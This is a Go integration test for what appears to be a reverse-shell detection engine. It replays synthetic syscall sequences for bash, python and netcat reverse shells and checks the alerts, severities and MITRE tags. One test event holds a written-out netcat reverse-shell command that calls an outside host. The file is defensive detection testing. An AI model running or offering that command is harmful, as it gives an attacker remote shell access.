package integration

import (
	"net"
	"testing"
	"time"

	"github.com/yoursec/rsbp/internal/correlation"
	"github.com/yoursec/rsbp/internal/types"
)

func TestEndToEndScenarios(t *testing.T) {
	correlation.SetAllowPrivateRemote(false)
	defer correlation.SetAllowPrivateRemote(true)

	tests := []Scenario{
		{
			Name: "bash direct dup2 reverse shell",
			Events: []types.SyscallEvent{
				event(3001, 1, 59, "/bin/bash", "bash -i", 0, "", 0),
				event(3001, 2, 41, "/bin/bash", "", 3, "", 0),
				event(3001, 3, 42, "/bin/bash", "", 3, "1.2.3.4", 4444),
				event(3001, 4, 33, "/bin/bash", "", 3, "", 0),
				event(3001, 5, 33, "/bin/bash", "", 3, "", 0),
				event(3001, 6, 33, "/bin/bash", "", 3, "", 0),
			},
			ExpectedFired:    true,
			ExpectedSeverity: types.SeverityCritical,
			ExpectedMITRE:    []string{"T1059", "T1104"},
		},
		{
			Name: "python reverse shell",
			Events: []types.SyscallEvent{
				event(3002, 1, 59, "/usr/bin/python3", "python3 -c import socket", 0, "", 0),
				event(3002, 2, 41, "/usr/bin/python3", "", 5, "", 0),
				event(3002, 3, 42, "/usr/bin/python3", "", 5, "9.9.9.9", 5555),
				event(3002, 4, 33, "/usr/bin/python3", "", 5, "", 0),
			},
			ExpectedFired:    true,
			ExpectedSeverity: types.SeverityCritical,
			ExpectedMITRE:    []string{"T1059", "T1104"},
		},
		{
			Name: "netcat reverse shell",
			Events: []types.SyscallEvent{
				event(3003, 1, 59, "/usr/bin/nc", "nc 4.4.4.4 4444 -e /bin/sh", 0, "", 0),
				event(3003, 2, 42, "/usr/bin/nc", "", 7, "4.4.4.4", 4444),
			},
			ExpectedFired:    true,
			ExpectedSeverity: types.SeverityHigh,
			ExpectedMITRE:    []string{"T1059", "T1104"},
		},
		{
			Name: "private target allowed with strong behavior",
			Events: []types.SyscallEvent{
				event(3004, 1, 59, "/bin/bash", "bash -i", 0, "", 0),
				event(3004, 2, 41, "/bin/bash", "", 3, "", 0),
				event(3004, 3, 42, "/bin/bash", "", 3, "192.168.1.10", 4444),
				event(3004, 4, 33, "/bin/bash", "", 3, "", 0),
			},
			ExpectedFired:    true,
			ExpectedSeverity: types.SeverityHigh,
			ExpectedMITRE:    []string{"T1059", "T1104"},
		},
		{
			Name: "timing window exceeded suppressed",
			Events: []types.SyscallEvent{
				event(3005, 1, 59, "/bin/bash", "bash -i", 0, "", 0),
				event(3005, 7, 41, "/bin/bash", "", 3, "", 0),
				event(3005, 13, 42, "/bin/bash", "", 3, "2.2.2.2", 4444),
				event(3005, 19, 33, "/bin/bash", "", 3, "", 0),
			},
			ExpectedFired: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.Name, func(t *testing.T) {
			RunScenario(t, tt)
		})
	}
}

func event(pid uint32, sec int64, syscall uint32, exe string, args string, fd int32, ip string, port uint16) types.SyscallEvent {
	ev := types.SyscallEvent{
		PID:         pid,
		PPID:        1,
		UID:         1000,
		GID:         1000,
		SyscallNr:   syscall,
		FD:          fd,
		TimestampNS: uint64(time.Unix(sec, 0).UnixNano()),
		Family:      2,
	}
	copy(ev.ExecPath[:], []byte(exe))
	copy(ev.Args[:], []byte(args))
	copy(ev.Comm[:], []byte("proc"))
	if ip != "" {
		v4 := net.ParseIP(ip).To4()
		if v4 != nil {
			ev.RemoteIP4 = uint32(v4[0]) | uint32(v4[1])<<8 | uint32(v4[2])<<16 | uint32(v4[3])<<24
			ev.RemotePort = port
		}
	}
	if syscall == 33 || syscall == 292 {
		ev.HasDup2Stdio = 1
	}
	return ev
}
